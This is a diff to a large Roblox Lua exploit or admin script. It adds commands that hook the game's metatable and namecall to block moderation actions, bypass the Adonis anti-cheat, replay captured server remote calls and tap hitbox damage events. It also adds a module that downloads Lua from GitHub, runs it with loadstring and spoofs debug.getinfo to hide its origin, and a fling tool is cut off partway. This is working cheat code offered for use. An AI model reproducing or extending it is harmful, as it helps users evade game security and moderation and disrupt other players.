-    if not Humanoid then return end
-    Humanoid:UnequipTools()
-    for _, x in next, Player.Backpack:GetChildren() do
-        if x:IsA("Tool") and x:FindFirstChild("Handle") then
-            table.insert(Tools, x)
-            Humanoid:EquipTool(x)
-        end
-    end
-    Humanoid:UnequipTools()
-    for _, x in next, Tools do
-        x.Parent = Character
-        x.Parent = Player.Backpack
-        x.Parent = Humanoid
-        x.Parent = Character
-    end
-    DoNotif("rightgrip: DONE", 2)
-end)
-addcmd('unhideguis',{},function(args, speaker)
-	for i,v in pairs(hiddenGUIS) do
-		v.Visible = true
-	end
-	hiddenGUIS = {}
-end)
-function deleteGuisAtPos()
-	pcall(function()
-		local guisAtPosition = PlayerGui:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)
-		for _, gui in pairs(guisAtPosition) do
-			if gui.Visible == true then
-				gui:Destroy()
-			end
-		end
-	end)
-end
-local deleteGuiInput
-addcmd('guidelete',{},function(args, speaker)
-	deleteGuiInput = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
-		if not gameProcessedEvent then
-			if input.KeyCode == Enum.KeyCode.Backspace then
-				deleteGuisAtPos()
-			end
-		end
-	end)
-	DoNotif('GUI Delete Enabled','Hover over a GUI and press backspace to delete it')
-end)
-addcmd('unguidelete',{'noguidelete'},function(args, speaker)
-	if deleteGuiInput then deleteGuiInput:Disconnect() end
-	DoNotif('GUI Delete Disabled','GUI backspace delete has been disabled')
-end)
 addcmd("mutevc", {}, function(args, speaker)
 	for _, plr in getPlayer(args[1], speaker) do
 		if plr == speaker then continue end
@@ -40063,6 +41770,180 @@ addcmd('antiabuse', {'nahadmin', 'bladmin'},
         end
     end
 )
+RegisterCommand({
+    Name        = "voidtrap",
+    Aliases     = {"void", "vt"},
+    Description = "void protection",
+    ArgsDesc    = {},
+    Permissions = {},
+}, function(args, speaker)
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LocalPlayer = Players.LocalPlayer
+    local Settings = {
+        AntiAnchor = true,
+        AntiFreeze = true,
+        AntiTP = false,
+        AntiFling = true,
+        VelocityThreshold = 150,
+        LastSafeCFrame = nil,
+        VoidTrap = true,
+        VoidPlatformY = -8000,
+        VoidPlatformSize = 1000,
+    }
+    local function getChar() return LocalPlayer.Character end
+    local function getRoot() return getChar() and getChar():FindFirstChild("HumanoidRootPart") end
+    local function getHum()  return getChar() and getChar():FindFirstChildOfClass("Humanoid") end
+    local mt = getrawmetatable(game)
+    local old_newindex = mt.__newindex
+    setreadonly(mt, false)
+    mt.__newindex = newcclosure(function(t, k, v)
+        if not checkcaller() then
+            if k == "Anchored" and Settings.AntiAnchor and t:IsDescendantOf(getChar()) then
+                return nil
+            end
+            if (k == "WalkSpeed" or k == "JumpPower") and Settings.AntiFreeze and t:IsA("Humanoid") then
+                if v == 0 then return nil end
+            end
+        end
+        return old_newindex(t, k, v)
+    end)
+    setreadonly(mt, true)
+    local voidPlatform = nil
+    local function buildVoidPlatform()
+        workspace.FallenPartsDestroyHeight = -50000
+        voidPlatform = Instance.new("Part")
+        voidPlatform.Name         = "TITANIUM_VoidBase"
+        voidPlatform.Size         = Vector3.new(Settings.VoidPlatformSize, 1, Settings.VoidPlatformSize)
+        voidPlatform.CFrame       = CFrame.new(0, Settings.VoidPlatformY, 0)
+        voidPlatform.Anchored     = true
+        voidPlatform.CanCollide   = true
+        voidPlatform.Transparency = 1
+        voidPlatform.CastShadow   = false
+        voidPlatform.CanQuery     = false
+        voidPlatform.Locked       = true
+        voidPlatform.Parent       = workspace
+    end
+    local function dropToVoid()
+        local root = getRoot()
+        if root then
+            root.CFrame = CFrame.new(
+                0,
+                Settings.VoidPlatformY + 3,
+                0
+            )
+            root.AssemblyLinearVelocity  = Vector3.zero
+            root.AssemblyAngularVelocity = Vector3.zero
+        end
+    end
+    if Settings.VoidTrap then
+        buildVoidPlatform()
+        if getChar() then
+            dropToVoid()
+        else
+            LocalPlayer.CharacterAdded:Wait()
+            task.wait(0.5)
+            dropToVoid()
+        end
+        RunService.Heartbeat:Connect(function()
+            if not (voidPlatform and voidPlatform.Parent) then
+                buildVoidPlatform()
+            else
+                if not voidPlatform.Anchored then
+                    voidPlatform.Anchored = true
+                end
+            end
+            if workspace.FallenPartsDestroyHeight > -50000 then
+                workspace.FallenPartsDestroyHeight = -50000
+            end
+        end)
+    end
+    RunService.Heartbeat:Connect(function()
+        local char = getChar()
+        local root = getRoot()
+        local hum  = getHum()
+        if not (char and root and hum) then return end
+        if Settings.AntiAnchor then
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") and part.Anchored then
+                    part.Anchored = false
+                end
+            end
+        end
+        if Settings.AntiFreeze then
+            if hum.PlatformStand then hum.PlatformStand = false end
+            if hum.Sit and not hum.SeatPart then hum.Sit = false end
+        end
+        if Settings.AntiFling then
+            local vel    = root.AssemblyLinearVelocity
+            local rotVel = root.AssemblyAngularVelocity
+            if vel.Magnitude > Settings.VelocityThreshold or rotVel.Magnitude > Settings.VelocityThreshold then
+                root.AssemblyLinearVelocity  = Vector3.zero
+                root.AssemblyAngularVelocity = Vector3.zero
+                if Settings.LastSafeCFrame then
+                    root.CFrame = Settings.LastSafeCFrame
+                end
+            else
+                if hum.FloorMaterial ~= Enum.Material.Air then
+                    Settings.LastSafeCFrame = root.CFrame
+                end
+            end
+        end
+        for _, obj in ipairs(char:GetChildren()) do
+            if obj:IsA("Model") or obj:IsA("BasePart") then
+                local name = obj.Name:lower()
+                if name:find("jail") or name:find("cage") or name:find("prison") then
+                    obj:Destroy()
+                end
+            end
+        end
+    end)
+    if Settings.AntiTP then
+        local lastPos = getRoot() and getRoot().Position
+        RunService.Stepped:Connect(function()
+            local root = getRoot()
+            if root and lastPos then
+                if (root.Position - lastPos).Magnitude > 50 then
+                    root.CFrame = CFrame.new(lastPos)
+                end
+                lastPos = root.Position
+            end
+        end)
+    end
+    game.DescendantAdded:Connect(function(desc)
+        if desc:IsA("Explosion") then
+            if getRoot() and (desc.Position - getRoot().Position).Magnitude < 20 then
+                desc.Visible = false
+                desc:Destroy()
+            end
+        end
+    end)
+    DoNotif("[TITANIUM] Protections Active. Void trap armed.")
+end)
+RegisterCommand({
+    Name        = "false",
+    Aliases     = {"block", "forcefalse"},
+    Description = "Block a remote.",
+    ArgsDesc    = {},
+    Permissions = {},
+}, function(args, speaker)
+    local blocked = {}
+        local orig
+        local active = false
+        local function ensureHook()
+            if active then return end
+            active = true
+            orig = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+                local method = getnamecallmethod()
+                if blocked[self.Name] and
+                   (method == "FireServer" or method == "InvokeServer") then
+                    warn("[BlockRemote] Blocked: " .. self:GetFullName())
+                    return
+                end
+                return orig(self, ...)
+            end))
+        end
+end)
 addcmd("removeads", {"adblock"}, function(args, speaker)
 	while wait() do
 		pcall(function()
@@ -40092,7 +41973,7 @@ end)
 addcmd("unantigameplaypaused", {}, function(args, speaker)
     networkPaused:Disconnect()
 end)
-addcmd('clientantikick',{'antikick'},function(args, speaker)
+addcmd('clientantikick',{'antikick2'},function(args, speaker)
 	if not hookmetamethod then 
 		return DoNotif('Incompatible Exploit','Your exploit does not support this command (missing hookmetamethod)')
 	end
@@ -40159,126 +42040,159 @@ addcmd('toggleswim',{},function(args, speaker)
 		execCmd('swim')
 	end
 end)
-local lp = Players.LocalPlayer
-local AntiAdmin = {
-    Enabled = false,
-    Registry = {},
-    Watchdog = nil
-}
-local function log(msg: string)
-    print("[AntiAdmin]", msg)
-end
-local function register(conn: RBXScriptConnection)
-    table.insert(AntiAdmin.Registry, conn)
-    return conn
-end
-local function cleanup()
-    for _, conn in ipairs(AntiAdmin.Registry) do
-        if typeof(conn) == "RBXScriptConnection" then
-            conn:Disconnect()
-        end
+do
+    local _scanConn    = nil
+    local _tapConns    = {}
+    local _tagName     = "RaycastHitboxV4"
+    local _watchActive = false
+    local _tapActive   = false
+    local _eventLog    = {}
+    local MAX_LOG      = 100
+    local function _logEvent(entry)
+        table.insert(_eventLog, entry)
+        if #_eventLog > MAX_LOG then table.remove(_eventLog, 1) end
+        print(string.format(
+            "[HBScan][OnHit] obj=%s | hum=%s | pos=(%.1f,%.1f,%.1f) | group=%s | mat=%s",
+            entry.obj, entry.hum,
+            entry.pos.X, entry.pos.Y, entry.pos.Z,
+            tostring(entry.group), entry.material
+        ))
     end
-    AntiAdmin.Registry = {}
-    if AntiAdmin.Watchdog then
-        AntiAdmin.Watchdog:Disconnect()
-        AntiAdmin.Watchdog = nil
-    end
-end
-local function protectHumanoid(hum: Humanoid)
-    if not hum then return end
-    register(hum:GetPropertyChangedSignal("Health"):Connect(function()
-        if hum.Health <= 0 and hum.MaxHealth > 0 then
-            pcall(function() hum.Health = hum.MaxHealth end)
-            log("Prevented health zeroing.")
-        end
-    end))
-    register(hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
-        if hum.WalkSpeed <= 0 then
-            task.defer(function() pcall(function() hum.WalkSpeed = 16 end) end)
-        end
-    end))
-end
-local function onCharacterAdded(char: Model)
-    local hum = char:WaitForChild("Humanoid", 10)
-    local root = char:WaitForChild("HumanoidRootPart", 10)
-    if hum then protectHumanoid(hum) end
-    register(Workspace.DescendantAdded:Connect(function(obj)
-        if obj:IsA("Explosion") and root then
-            task.defer(function()
-                pcall(function()
-                    if (obj.Position - root.Position).Magnitude < obj.BlastRadius + 50 then
-                        obj.BlastRadius = 0
-                        obj.BlastPressure = 0
-                    end
-                end)
+    local function _tapHitbox(hb)
+        if not hb.OnHit then return end
+        local ok, conn = pcall(function()
+            return hb.OnHit:Connect(function(hitPart, humanoid, rayResult, group)
+                local pos = rayResult and rayResult.Position or Vector3.zero
+                local mat = rayResult and tostring(rayResult.Material):match("%.(.+)") or "?"
+                _logEvent({
+                    obj      = hitPart and hitPart:GetFullName() or "?",
+                    hum      = humanoid and humanoid.Parent and humanoid.Parent.Name or "none",
+                    pos      = pos,
+                    group    = group,
+                    material = mat,
+                    t        = os.clock()
+                })
             end)
+        end)
+        if ok and conn then table.insert(_tapConns, conn) end
+    end
+    local function _doScan()
+        local tagged = CollectionService:GetTagged(_tagName)
+        if #tagged == 0 then
+            DoNotif("No hitbox objects found. Tag: " .. _tagName, 3)
+            print("[HBScan] No objects tagged: " .. _tagName)
+            return
         end
-    end))
-    register(char.DescendantAdded:Connect(function(obj)
-        if obj:IsA("BodyVelocity") or obj:IsA("BodyForce") or obj:IsA("RocketPropulsion") then
-            task.defer(function() pcall(function() obj:Destroy() end) end)
-        end
-    end))
-end
-local function applyAdminHooks()
-    local hd = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
-    if hd and hd:FindFirstChild("Signals") then
-        local signals = {"ExecuteClientCommand", "ActivateClientCommand"}
-        for _, name in ipairs(signals) do
-            local s = hd.Signals:FindFirstChild(name)
-            if s then
-                register(s.OnClientEvent:Connect(function(cmd)
-                    log("HD Admin Signal Blocked: " .. tostring(cmd))
-                end))
+        print(string.format("[HBScan] === %d object(s) with tag '%s' ===", #tagged, _tagName))
+        for i, obj in ipairs(tagged) do
+            print(string.format("[HBScan]  [%d] %s", i, obj:GetFullName()))
+            local dmgPoints = 0
+            for _, desc in ipairs(obj:GetDescendants()) do
+                if desc:IsA("Attachment") and desc.Name == "DmgPoint" then dmgPoints += 1 end
+            end
+            if dmgPoints > 0 then
+                print(string.format("[HBScan]      DmgPoint attachments: %d", dmgPoints))
             end
         end
+        print("[HBScan] === End ===")
+        DoNotif(string.format("HBScan: %d hitbox object(s) — check F9.", #tagged), 3)
     end
-    local adonis = ReplicatedStorage:FindFirstChild("Adonis")
-    if adonis then
-        local remote = adonis:FindFirstChild("Remote") or adonis:FindFirstChildOfClass("RemoteEvent")
-        if remote then
-            register(remote.OnClientEvent:Connect(function(cmd)
-                log("Adonis Signal Blocked: " .. tostring(cmd))
-            end))
-        end
-    end
-end
-addcmd('antiadmin', {'blockadmin', 'noadmin'}, 
-    function(args, speaker)
-        if AntiAdmin.Enabled then
-            AntiAdmin.Enabled = false
-            cleanup()
-            log("AntiAdmin Protection: DISABLED")
+    addcmd("hbscan", {"scanhitbox", "hitboxscan"}, function(args, speaker)
+        _doScan()
+    end)
+    addcmd("hbwatch", {"watchhitbox"}, function(args, speaker)
+        _watchActive = not _watchActive
+        if _watchActive then
+            _doScan()
+            _scanConn = CollectionService:GetInstanceAddedSignal(_tagName):Connect(function(obj)
+                local n = 0
+                for _, d in ipairs(obj:GetDescendants()) do
+                    if d:IsA("Attachment") and d.Name == "DmgPoint" then n += 1 end
+                end
+                print(string.format("[HBWatch] + ADDED: %s | DmgPoints: %d", obj:GetFullName(), n))
+                DoNotif("HBWatch: new hitbox → " .. obj.Name, 1.5)
+            end)
+            CollectionService:GetInstanceRemovedSignal(_tagName):Connect(function(obj)
+                print("[HBWatch] - REMOVED: " .. obj:GetFullName())
+            end)
+            DoNotif("HBWatch: ENABLED — watching '" .. _tagName .. "'", 3)
         else
-            AntiAdmin.Enabled = true
-            log("AntiAdmin Protection: ENABLED")
-            if lp.Character then 
-                task.spawn(onCharacterAdded, lp.Character) 
-            end
-            register(lp.CharacterAdded:Connect(onCharacterAdded))
-            applyAdminHooks()
-            local lastCheck = 0
-            AntiAdmin.Watchdog = RunService.Heartbeat:Connect(function(dt)
-                lastCheck += dt
-                if lastCheck < 1 then return end
-                lastCheck = 0
-                local pg = lp:FindFirstChild("PlayerGui")
-                if pg then
-                    for _, obj in ipairs(pg:GetDescendants()) do
-                        if obj:IsA("Frame") and obj.Size.X.Scale > 0.9 and obj.BackgroundColor3 == Color3.new(0,0,0) then
-                            pcall(function() obj:Destroy() end)
+            if _scanConn then _scanConn:Disconnect() _scanConn = nil end
+            DoNotif("HBWatch: DISABLED", 2)
+        end
+    end)
+    addcmd("hbtap", {"taphitbox", "hitboxtap"}, function(args, speaker)
+        _tapActive = not _tapActive
+        if _tapActive then
+            for _, c in ipairs(_tapConns) do c:Disconnect() end
+            _tapConns = {}
+            _eventLog = {}
+            local hitboxList = nil
+            if getreg then
+                local ok, reg = pcall(getreg)
+                if ok then
+                    for _, v in ipairs(reg) do
+                        if type(v) == "table" then
+                            local f = v[1]
+                            if type(f) == "table" and f.HitboxObject and f.OnHit then
+                                hitboxList = v; break
+                            end
                         end
                     end
                 end
-                for _, obj in ipairs(Lighting:GetChildren()) do
-                    if obj:IsA("ColorCorrectionEffect") and obj.Brightness < -0.8 then
-                        pcall(function() obj:Destroy() end)
-                    end
-                end
-            end)
+            end
+            if hitboxList then
+                for _, hb in ipairs(hitboxList) do _tapHitbox(hb) end
+                DoNotif(string.format("HBTap: ENABLED — tapped %d hitbox(es)", #_tapConns), 3)
+                print(string.format("[HBTap] Tapped %d OnHit signal(s).", #_tapConns))
+            else
+                DoNotif("HBTap: getreg couldn't find hitbox list. Try hbscan first.", 3)
+            end
+        else
+            for _, c in ipairs(_tapConns) do c:Disconnect() end
+            _tapConns = {}
+            DoNotif("HBTap: DISABLED", 2)
         end
-    end
-)
+    end)
+    addcmd("hbdump", {"hitboxdump"}, function(args, speaker)
+        if #_eventLog == 0 then
+            DoNotif("HBDump: no events yet. Use ;hbtap first.", 3); return
+        end
+        print(string.format("[HBDump] === %d event(s) ===", #_eventLog))
+        for i, e in ipairs(_eventLog) do
+            print(string.format(
+                "[%d] t=%.2f | %s | hum=%s | pos=(%.1f,%.1f,%.1f) | group=%s | mat=%s",
+                i, e.t, e.obj, e.hum, e.pos.X, e.pos.Y, e.pos.Z, tostring(e.group), e.material
+            ))
+        end
+        print("[HBDump] === End ===")
+        local lines = {}
+        for i, e in ipairs(_eventLog) do
+            table.insert(lines, string.format("[%d] %.2f | %s | %s | (%.1f,%.1f,%.1f) | group=%s | mat=%s",
+                i, e.t, e.obj, e.hum, e.pos.X, e.pos.Y, e.pos.Z, tostring(e.group), e.material))
+        end
+        local out = table.concat(lines, "\n")
+        if setclipboard then setclipboard(out)
+        elseif toclipboard then toclipboard(out) end
+        DoNotif("HBDump: " .. #_eventLog .. " events copied.", 3)
+    end)
+    addcmd("hbscantag", {}, function(args, speaker)
+        if not args[1] then DoNotif("Scanner tag: " .. _tagName, 3); return end
+        _tagName = args[1]
+        DoNotif("HBScan tag set to: " .. _tagName, 2)
+    end)
+end
+    addcmd("replay", {"refire", "repeat"}, function(args, speaker)
+        if not lastCall then return DoNotif("No call captured yet.", 2) end
+        local count = tonumber(args[1]) or 1
+        for i = 1, count do
+            pcall(function()
+                lastCall.remote:FireServer(table.unpack(lastCall.args))
+            end)
+            if count > 1 then task.wait(0.05) end
+        end
+        DoNotif("Replayed " .. count .. "x: " .. lastCall.remote.Name, 2)
+    end)
 local Services = {
     Players          = game:GetService("Players"),
     RunService       = game:GetService("RunService"),
@@ -41043,7 +42957,7 @@ Modules.AdonisBypass = {
         IsLoaded = false,
     },
     Config = {
-        DelayTime = 35
+        DelayTime = 15
     }
 }
 function Modules.AdonisBypass:Execute()
@@ -41054,7 +42968,7 @@ function Modules.AdonisBypass:Execute()
         end)
         if success then
             self.State.IsLoaded = true
-            print("- Zukas Panel -")
+            print("- Bye Bye Adonis! -")
         else
             warn("Failed to load Zukas Panel: " .. tostring(err))
         end
@@ -41069,6 +42983,265 @@ function Modules.AdonisBypass:Initialize()
         Description = "Manually bypass Adonis "
     }, function()
         module:Execute()
+    end)
+end
+Modules.Deobfuscator = {
+    State = {
+        IsEnabled = false,
+        UI = {},
+        Connections = {},
+        IsLifting = false,
+        VFS_Cache = {},
+        VFS_Loading = {},
+        VFS_Base = "https://raw.githubusercontent.com/zukatech1/Lifter/main/src/"
+    },
+    Config = {
+        ACCENT = Color3.fromRGB(0, 255, 255),
+        BG = Color3.fromRGB(20, 20, 20),
+        LIFT_COLOR = Color3.fromRGB(170, 0, 255),
+        KEYWORDS = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while", "execute", "syn", "HttpGet", "HttpPost"},
+        GLOBALS = {"getrawmetatable", "game", "Workspace", "script", "math", "string", "table", "print", "wait", "Instance", "Vector3", "CFrame", "Enum", "loadstring", "getgenv", "getrenv", "getreg", "getgc"},
+        REMOTES = {"FireServer", "InvokeServer"},
+        TOKENS = {["="]=true, ["."]=true, [","]=true, ["("]=true, [")"]=true, ["["]=true, ["]"]=true, ["{"]=true, ["}"]=true, [":"]=true, ["*"]=true, ["/"]=true, ["+"]=true, ["-"]=true, ["%"]=true, [";"]=true, ["~"]=true}
+    },
+    Dependencies = {"Players", "CoreGui", "UserInputService", "RunService", "TextService", "HttpService"},
+    Services = {}
+}
+function Modules.Deobfuscator:_vRequire(modulePath)
+    local state = self.State
+    if state.VFS_Cache[modulePath] then
+        return state.VFS_Cache[modulePath]
+    end
+    if state.VFS_Loading[modulePath] then
+        return state.VFS_Loading[modulePath]
+    end
+    local internalPath = modulePath:gsub("%.", "/") .. ".lua"
+    local url = state.VFS_Base .. internalPath
+    local success, content = pcall(game.HttpGet, game, url)
+    if not success or content:find("404: Not Found") then
+        local fallbackUrl = "https://raw.githubusercontent.com/zukatech1/Lifter/main/" .. internalPath
+        success, content = pcall(game.HttpGet, game, fallbackUrl)
+    end
+    if not success or content:find("404: Not Found") then
+        warn("--> [VFS] Resolution Failed: " .. modulePath)
+        return nil
+    end
+    local func, err = loadstring(content, "@VFS/" .. modulePath)
+    if not func then
+        warn("--> [VFS] Syntax Error in " .. modulePath .. ": " .. err)
+        return nil
+    end
+    local modulePlaceholder = {}
+    state.VFS_Loading[modulePath] = modulePlaceholder
+    local env = getfenv(func)
+    env.require = function(path) return self:_vRequire(path) end
+    env.arg = {}
+    env.print = function(...) print("[LIFTER]:", ...) end
+    setfenv(func, env)
+    local result = func()
+    local finalData = result or modulePlaceholder
+    state.VFS_Cache[modulePath] = finalData
+    state.VFS_Loading[modulePath] = nil
+    return finalData
+end
+function Modules.Deobfuscator:_initializeLifter()
+    self.State.VFS_Cache = {}
+    self.State.VFS_Loading = {}
+    local Parser = self:_vRequire("prometheus.parser")
+    local Ast = self:_vRequire("prometheus.ast")
+    local VisitAst = self:_vRequire("prometheus.visitast")
+    local Unparser = self:_vRequire("prometheus.unparser")
+    return {
+        Parser = Parser,
+        Ast = Ast,
+        VisitAst = VisitAst,
+        Unparser = Unparser
+    }
+end
+function Modules.Deobfuscator:_process(str, keywordList)
+    local K = {}
+    for _, v in pairs(keywordList) do K[v] = true end
+    local S = str:gsub(".", function(c) return self.Config.TOKENS[c] and " " or c end)
+    S = S:gsub("%S+", function(c) return K[c] and c or (" "):rep(#c) end)
+    return S
+end
+function Modules.Deobfuscator:_update()
+    local ui = self.State.UI
+    if not ui.Source then return end
+    local text = ui.Source.Text:gsub("\r", ""):gsub("\t", "    ")
+    local textHeight = self.Services.TextService:GetTextSize(text, 14, Enum.Font.Code, Vector2.new(ui.EditorScroll.AbsoluteSize.X - 40, math.huge)).Y
+    local finalHeight = math.max(textHeight + 50, ui.EditorScroll.AbsoluteSize.Y)
+    ui.EditorScroll.CanvasSize = UDim2.fromOffset(0, finalHeight)
+    ui.Source.Size = UDim2.new(1, -40, 0, finalHeight)
+    ui.Keywords.Text = self:_process(text, self.Config.KEYWORDS)
+    ui.Globals.Text = self:_process(text, self.Config.GLOBALS)
+    ui.Remotes.Text = self:_process(text, self.Config.REMOTES)
+    local _, lineCount = text:gsub("\n", "")
+    ui.Lines.Text = ""
+    for i = 1, lineCount + 1 do
+        ui.Lines.Text ..= i .. "\n"
+    end
+end
+function Modules.Deobfuscator:CreateUI()
+    if self.State.UI.Main then self.State.UI.Main.Visible = true return end
+    local sg = Instance.new("ScreenGui", self.Services.CoreGui)
+    sg.Name = "Zuka_RC7_Editor"
+    sg.ResetOnSpawn = false
+    local main = Instance.new("Frame", sg)
+    main.Size = UDim2.fromOffset(600, 420)
+    main.Position = UDim2.fromScale(0.5, 0.5)
+    main.AnchorPoint = Vector2.new(0.5, 0.5)
+    main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    main.BackgroundTransparency = 0.2
+    main.BorderSizePixel = 1
+    main.BorderColor3 = self.Config.ACCENT
+    main.ClipsDescendants = true
+    main.Active = true
+    local header = Instance.new("Frame", main)
+    header.Size = UDim2.new(1, 0, 0, 30)
+    header.BackgroundColor3 = Color3.fromRGB(255, 85, 127)
+    header.BorderSizePixel = 0
+    local title = Instance.new("TextLabel", header)
+    title.Size = UDim2.new(1, -60, 1, 0)
+    title.Position = UDim2.fromOffset(10, 0)
+    title.Text = "Zukas Lifter."
+    title.TextColor3 = self.Config.ACCENT
+    title.Font = Enum.Font.Code
+    title.TextSize = 14
+    title.TextXAlignment = Enum.TextXAlignment.Left; title.BackgroundTransparency = 1
+    local close = Instance.new("TextButton", header)
+    close.Size = UDim2.fromOffset(30, 30)
+    close.Position = UDim2.new(1, -30, 0, 0)
+    close.Text = "X"; close.TextColor3 = Color3.new(1,0,0); close.BackgroundTransparency = 1
+    close.MouseButton1Click:Connect(function() sg:Destroy(); self.State.UI = {} end)
+    local scroll = Instance.new("ScrollingFrame", main)
+    scroll.Size = UDim2.new(1, -10, 1, -85)
+    scroll.Position = UDim2.fromOffset(5, 35)
+    scroll.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    scroll.BackgroundTransparency = 0.4
+    scroll.BorderSizePixel = 1
+    scroll.BorderColor3 = Color3.fromRGB(50, 50, 50)
+    scroll.ScrollBarThickness = 4
+    scroll.ScrollBarImageColor3 = self.Config.ACCENT
+    local lines = Instance.new("TextLabel", scroll)
+    lines.Size = UDim2.new(0, 30, 1, 0)
+    lines.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    lines.BorderSizePixel = 0
+    lines.Text = "1"; lines.TextColor3 = Color3.fromRGB(100, 100, 100)
+    lines.Font = Enum.Font.Code; lines.TextSize = 14; lines.TextYAlignment = "Top"
+    local source = Instance.new("TextBox", scroll)
+    source.Size = UDim2.new(1, -35, 1, 0)
+    source.Position = UDim2.fromOffset(35, 0)
+    source.BackgroundTransparency = 1
+    source.TextColor3 = Color3.fromRGB(220, 220, 220)
+    source.Font = Enum.Font.Code
+    source.TextSize = 14
+    source.TextXAlignment = Enum.TextXAlignment.Left; source.TextYAlignment = "Top"
+    source.MultiLine = true; source.ClearTextOnFocus = false
+    source.Text = ""
+    local function mkOverlay(name, color)
+        local l = Instance.new("TextLabel", source)
+        l.Name = name; l.Size = UDim2.fromScale(1, 1); l.BackgroundTransparency = 1
+        l.Font = Enum.Font.Code; l.TextSize = 14; l.TextXAlignment = "Left"; l.TextYAlignment = "Top"
+        l.TextColor3 = color; l.Text = ""; l.ZIndex = 3
+        return l
+    end
+    local kw = mkOverlay("Keywords", Color3.fromRGB(255, 80, 80))
+    local gb = mkOverlay("Globals", Color3.fromRGB(80, 180, 255))
+    local rm = mkOverlay("Remotes", Color3.fromRGB(0, 255, 150))
+    local footer = Instance.new("Frame", main)
+    footer.Size = UDim2.new(1, 0, 0, 45)
+    footer.Position = UDim2.new(0, 0, 1, -45)
+    footer.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    footer.BorderSizePixel = 0
+    local function mkBtn(text, pos, color, cb)
+        local b = Instance.new("TextButton", footer)
+        b.Size = UDim2.fromOffset(110, 30)
+        b.Position = pos
+        b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        b.BorderSizePixel = 1; b.BorderColor3 = color
+        b.Text = text; b.TextColor3 = color; b.Font = Enum.Font.Code; b.TextSize = 13
+        b.MouseButton1Click:Connect(cb)
+        return b
+    end
+    mkBtn("EXECUTE", UDim2.fromOffset(10, 7), self.Config.ACCENT, function()
+        local f, e = loadstring(source.Text)
+        if f then task.spawn(f); DoNotif("Executed.", 1) else warn(e); DoNotif("Syntax Error", 2) end
+    end)
+    mkBtn("LIFT (PROM)", UDim2.fromOffset(130, 7), self.Config.LIFT_COLOR, function()
+        if self.State.IsLifting then return end
+        self.State.IsLifting = true
+        task.spawn(function()
+            local _old_info = debug.getinfo
+            getgenv().debug.getinfo = function(f, ...)
+                local res = _old_info(f, ...)
+                if res and res.source and res.source:find("VFS") then
+                    res.source = "=[C]"
+                end
+                return res
+            end
+            local components = self:_initializeLifter()
+            if not components.Parser then
+                self.State.IsLifting = false
+                return DoNotif("VFS Error. Check F9.", 3)
+            end
+            local inputCode = source.Text
+            if #inputCode == 0 then
+                self.State.IsLifting = false
+                return DoNotif("Source empty.", 2)
+            end
+            DoNotif("Lifting: Analyzing AST...", 2)
+            local success, ast = pcall(function()
+                local p = components.Parser:new({ LuaVersion = "LuaU" })
+                return p:parse(inputCode)
+            end)
+            if not success or not ast then
+                warn("--> [Lifter] Fatal Error: " .. tostring(ast))
+                self.State.IsLifting = false
+                return DoNotif("Deobfuscation Failed.", 3)
+            end
+            local u = components.Unparser:new({ LuaVersion = "LuaU", PrettyPrint = true, IndentSpaces = 4 })
+            local liftedCode = u:unparse(ast)
+            liftedCode = liftedCode:gsub('"([^"]*)"%s*%.%.%s*"([^"]*)"', '"%1%2"')
+            source.Text = liftedCode
+            self:_update()
+            self.State.IsLifting = false
+            DoNotif("Code Lifted.", 2)
+            getgenv().debug.getinfo = _old_info
+        end)
+    end)
+    mkBtn("CLEAR", UDim2.fromOffset(250, 7), Color3.fromRGB(255, 150, 0), function()
+        source.Text = ""
+    end)
+    source:GetPropertyChangedSignal("Text"):Connect(function()
+        self:_update()
+    end)
+    local dragging, dragStart, startPos
+    header.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging, dragStart, startPos = true, input.Position, main.Position
+        end
+    end)
+    self.Services.UserInputService.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - dragStart
+            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    self.Services.UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
+    end)
+    self.State.UI = {Main = main, Source = source, EditorScroll = scroll, Lines = lines, Keywords = kw, Globals = gb, Remotes = rm}
+    DoNotif("Forensic IDE Ready.", 2)
+end
+function Modules.Deobfuscator:Initialize()
+    for _, s in ipairs(self.Dependencies) do self.Services[s] = game:GetService(s) end
+    RegisterCommand({
+        Name = "ide",
+        Aliases = {"lift", "exe", "internal"},
+        Description = "Stable Forensic IDE with circular-dependency protection."
+    }, function()
+        self:CreateUI()
     end)
 end
 Modules.AntiAttach = {
@@ -41145,6 +43318,158 @@ function Modules.AntiAttach:Toggle()
         self.State.Countering = false
     end
 end
+RegisterCommand({
+    Name        = "control",
+    Aliases     = {"con", "fetool"},
+    Description = "might not work",
+    ArgsDesc    = {},
+    Permissions = {},
+}, function(args, speaker)
+    local MaxSpeed = 1
+    local MovementPower = 10
+    local FlingHotkey = "X"
+    local FlingPower = 69420
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local StarterGui = game:GetService("StarterGui")
+    local UserInputService = game:GetService("UserInputService")
+    local Camera = workspace.CurrentCamera
+    local Player = Players.LocalPlayer
+    local Backpack = Player.Backpack
+    local Character = Player.Character or workspace:FindFirstChild(Player.Name, true)
+    local Tool = Character:FindFirstChildWhichIsA("Tool") or Backpack:FindFirstChildWhichIsA("Tool")
+    local Handle = Tool and Tool:FindFirstChild("Handle")
+    local Humanoid = Character and Character:FindFirstChildWhichIsA("Humanoid")
+    local RootPart = Humanoid and Humanoid.RootPart
+    if not (Handle or RootPart) then
+        return warn("Error occurred")
+    end
+    local ResetBind = Instance.new("BindableEvent")
+    local OldRPos = RootPart.Position
+    for i = 1, 2 do
